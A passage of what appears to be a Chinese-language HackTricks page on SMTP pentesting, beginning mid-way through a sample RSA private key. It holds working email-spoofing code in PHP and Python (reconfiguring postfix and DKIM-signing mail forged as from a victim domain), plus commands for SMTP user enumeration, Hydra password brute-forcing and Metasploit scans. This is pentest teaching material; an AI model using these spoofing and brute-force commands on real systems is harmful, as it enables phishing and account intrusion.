spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
</code></pre>
<p>{% endhint %}</p>
<p><strong>或者你可以手动执行：</strong></p>
<p>{% tabs %}
{% tab title="PHP" %}</p>
<pre class="language-php"><code class="lang-php"><strong># 这将发送一条未签名的消息
</strong><strong>mail("your_email@gmail.com", "测试主题！", "嘿！这是一个测试", "来自：administrator@victim.com");
</strong></code></pre>
<p>{% endtab %}</p>
<p>{% tab title="Python" %}</p>
<pre><code class="language-python"># Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
&lt;html&gt;
&lt;body&gt;
&lt;h3&gt;This is a test, not a scam&lt;/h3&gt;
&lt;br /&gt;
&lt;/body&gt;
&lt;/html&gt;
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2&gt; /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h3 id="更多信息"><a class="header" href="#更多信息"><strong>更多信息</strong></a></h3>
<p><strong>在</strong> <a href="https://seanthegeek.net/459/demystifying-dmarc/"><strong>https://seanthegeek.net/459/demystifying-dmarc/</strong></a> <strong>中找到有关这些保护的更多信息</strong></p>
<h3 id="其他钓鱼指标"><a class="header" href="#其他钓鱼指标"><strong>其他钓鱼指标</strong></a></h3>
<ul>
<li>域名的年龄</li>
<li>指向IP地址的链接</li>
<li>链接操控技术</li>
<li>可疑（不常见）附件</li>
<li>损坏的电子邮件内容</li>
<li>使用的值与邮件头不同</li>
<li>存在有效且受信任的SSL证书</li>
<li>将页面提交给网络内容过滤网站</li>
</ul>
<h2 id="通过smtp进行外泄"><a class="header" href="#通过smtp进行外泄">通过SMTP进行外泄</a></h2>
<p><strong>如果您可以通过SMTP发送数据</strong> <a href="../../generic-hacking/exfiltration.html#smtp"><strong>请阅读此文</strong></a><strong>。</strong></p>
<h2 id="配置文件"><a class="header" href="#配置文件">配置文件</a></h2>
<h3 id="postfix"><a class="header" href="#postfix">Postfix</a></h3>
<p>通常，如果已安装，<code>/etc/postfix/master.cf</code> 中包含 <strong>在用户收到新邮件时执行的脚本</strong>。例如，<code>flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}</code> 这一行意味着如果用户mark收到新邮件，将执行<code>/etc/postfix/filtering</code>。</p>
<p>其他配置文件：</p>
<pre><code>sendmail.cf
submit.cf
</code></pre>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/">https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/</a></li>
<li><a href="https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/">https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/</a></li>
</ul>
<h2 id="hacktricks-自动命令"><a class="header" href="#hacktricks-自动命令">HackTricks 自动命令</a></h2>
<pre><code>Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &amp;&amp;&amp;&amp; openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

</code></pre>
<figure><img src="../../.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>从黑客的角度看待您的网络应用、网络和云</strong></p>
<p><strong>查找并报告具有实际商业影响的关键可利用漏洞。</strong> 使用我们20多个自定义工具来映射攻击面，发现让您提升权限的安全问题，并使用自动化利用收集重要证据，将您的辛勤工作转化为有说服力的报告。</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** 上关注我们。**</li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-telnet.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-smtp/smtp-smuggling.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-telnet.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-smtp/smtp-smuggling.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
